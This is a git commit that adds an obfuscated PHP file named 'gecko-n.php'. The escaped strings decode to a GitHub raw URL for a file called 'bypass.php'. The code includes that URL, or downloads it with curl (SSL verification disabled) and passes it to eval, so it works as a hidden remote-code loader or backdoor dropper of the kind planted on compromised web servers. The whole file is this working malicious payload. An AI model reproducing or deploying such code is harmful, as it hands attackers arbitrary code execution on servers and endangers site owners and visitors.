d05f47b941d07cedb9dc32ee8e08baa4fa97eb6e
cukyiblis-crypto <cukyiblis@gmail.com>
2026-06-11 12:03:06 +0700

    Create gecko-n.php

---
+++ gecko-n.php
@@ -0,0 +1,9 @@
+<?php
+/*   __________________________________________________
+    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
+    |              on 2026-01-31 15:51:08              |
+    |    GitHub: https://github.com/pk-fr/yakpro-po    |
+    |__________________________________________________|
+*/
+goto f5EVt; GWotK: $L5t_k = curl_exec($qdSr_); goto GWkOy; GWkOy: curl_close($qdSr_); goto Am5td; IiXcp: eval("\77\x3e" . $L5t_k); goto ghVt3; Am5td: Nfglu: goto IiXcp; w3PJK: include $TD2tl; goto WBpsN; ll_Qe: if (ini_get("\141\154\x6c\157\x77\137\165\162\154\137\x69\156\x63\x6c\165\144\145")) { goto wsyfH; } goto MDp_B; zTNB8: if ($L5t_k) { goto Nfglu; } goto Nb1gS; MDp_B: $L5t_k = @file_get_contents($TD2tl); goto zTNB8; WOvR0: wsyfH: goto w3PJK; f5EVt: $TD2tl = "\150\x74\164\160\163\x3a\57\x2f\162\141\x77\56\x67\151\x74\150\x75\142\165\x73\x65\162\143\157\x6e\164\145\156\164\x2e\143\157\x6d\57\x6e\157\x74\x69\146\x37\67\57\x63\x75\x73\57\x6d\x61\151\156\57\142\x79\x70\141\163\x73\x2e\x70\150\160"; goto ll_Qe; yb93E: curl_setopt_array($qdSr_, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0]); goto GWotK; Nb1gS: $qdSr_ = curl_init($TD2tl); goto yb93E; ghVt3: goto ejvU3; goto WOvR0; WBpsN: ejvU3:
+
